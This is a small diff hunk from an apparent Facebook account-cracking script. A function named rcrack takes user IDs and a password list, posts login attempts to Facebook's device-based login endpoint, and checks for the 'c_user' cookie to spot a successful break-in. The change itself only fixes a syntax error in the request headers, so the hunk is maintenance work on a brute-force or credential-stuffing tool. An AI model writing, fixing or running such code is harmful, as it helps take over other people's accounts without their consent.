@@ -854,7 +854,7 @@ def rcrack(ids,passlist):
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
-           'user-agent': pro',}
+           'user-agent': pro}
 			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
